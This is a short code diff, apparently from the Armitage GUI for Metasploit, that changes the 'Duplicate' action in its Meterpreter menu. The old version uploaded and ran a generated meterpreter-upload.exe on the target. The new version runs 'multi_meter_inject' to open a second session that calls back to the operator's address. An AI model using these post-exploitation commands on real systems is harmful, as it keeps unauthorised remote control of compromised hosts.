@@ -137,9 +137,10 @@ sub showMeterpreterMenu {
 		$j = menu($1, "Access", 'A');
 	
 		item($j, "Duplicate", 'D', lambda({
-			meterpreterPayload("meterpreter-upload.exe", lambda({
-				if ($1 eq "generate -t exe -f meterpreter-upload.exe\n") {
-					m_cmd($sid, "run uploadexec -e meterpreter-upload.exe");
+			oneTimeShow("run");
+			cmd_safe("setg LPORT", lambda({
+				if ([$3 trim] ismatch 'LPORT .. (\d+).*') {
+					m_cmd($sid, "run multi_meter_inject -mr $MY_ADDRESS -p " . matched()[0]);
 				}
 			}, \$sid));
 		}, $sid => "$sid"));
